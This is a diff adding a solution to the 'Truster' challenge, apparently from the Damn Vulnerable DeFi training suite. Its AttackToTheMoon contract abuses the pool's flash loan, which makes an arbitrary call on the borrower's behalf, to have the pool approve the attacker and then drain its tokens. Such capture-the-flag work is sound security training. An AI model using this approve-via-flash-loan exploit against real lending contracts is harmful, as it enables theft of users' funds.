@@ -51,7 +51,10 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        new AttackToTheMoon(pool, token, recovery);
+
+        console.log("pool balance: ", token.balanceOf(address(pool)));
+        console.log("recovery balance: ", token.balanceOf(recovery));
     }
 
     /**
@@ -64,5 +67,12 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract AttackToTheMoon {
+    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
+        pool.flashLoan(1_000_000e18, address(pool), address(token), abi.encodeWithSelector(token.approve.selector, address(this), 1_000_000e18));
+        token.transferFrom(address(pool), recovery, 1_000_000e18);
     }
 }
